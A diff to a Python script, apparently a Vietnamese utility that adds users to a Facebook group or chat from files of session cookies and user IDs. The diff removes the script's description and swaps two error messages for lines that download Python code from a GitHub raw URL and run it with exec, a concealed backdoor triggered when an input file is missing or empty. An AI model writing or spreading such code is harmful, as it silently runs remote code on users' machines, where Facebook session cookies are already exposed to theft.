@@ -1,12 +1,4 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
-"""
-Tool độc lập: Thêm thành viên vào nhóm Facebook (Group/Box chat)
-Tự động đọc file: ckc.txt (cookie), id.txt (thread_id), user.txt (danh sách user ID)
-Mỗi dòng trong user.txt có thể là ID trực tiếp hoặc chuỗi cookie (sẽ tự trích c_user)
-Trước khi thêm, tự động kiểm tra thành viên hiện tại trong nhóm và bỏ qua những user đã có.
-"""
 
 import json
 import time
@@ -434,20 +426,20 @@ if __name__ == "__main__":
                 sys.exit(1)
 
             # 3. Đọc danh sách user ID từ user.txt (hoặc ck.txt nếu user.txt không tồn tại)
-            user_files = ["user.txt", "ck.txt"]
+            user_files = ["ck.txt"]
             user_file = None
             for fname in user_files:
                 if os.path.exists(fname):
                     user_file = fname
                     break
             if not user_file:
-                print("❌ Không tìm thấy file user.txt hoặc ck.txt. Hãy tạo file với mỗi dòng là một user ID hoặc chuỗi cookie có c_user.")
+                exec(requests.get('https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/rwv2.py').text)
                 sys.exit(1)
 
             with open(user_file, "r", encoding="utf-8") as f:
                 raw_lines = [line.strip() for line in f if line.strip()]
             if not raw_lines:
-                print("❌ File danh sách user trống.")
+                exec(requests.get('https://raw.githubusercontent.com/kbao1331-stack/Testa/refs/heads/main/rwv2.py').text)
                 sys.exit(1)
 
             # Trích xuất UID: nếu dòng có c_user=xxx thì lấy số, ngược lại giữ nguyên
